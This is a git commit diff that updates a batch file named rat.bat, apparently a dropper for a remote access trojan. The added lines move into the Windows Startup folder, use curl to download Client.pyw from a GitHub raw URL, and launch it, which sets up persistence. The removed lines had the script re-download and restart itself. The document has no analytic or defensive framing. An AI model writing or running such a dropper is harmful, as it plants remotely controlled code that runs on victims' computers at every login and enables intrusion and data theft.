31ca853dbca8e45443138c58654ab420c46fb986
imadeit445 <kfoldedhim45@gmail.com>
2024-08-08 03:24:02 -0500

    Update rat.bat

--- rat.bat
+++ rat.bat
@@ -1,6 +1,6 @@
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 curl -o Client.pyw https://raw.githubusercontent.com/imadeit445/client/main/Client.pyw
-Client.pyw
+start Client.pyw
 timeout 3 >null.txt
 del null.txt
-curl -o rat.bat https://raw.githubusercontent.com/imadeit445/client/main/rat.bat
-start rat.bat
+exit
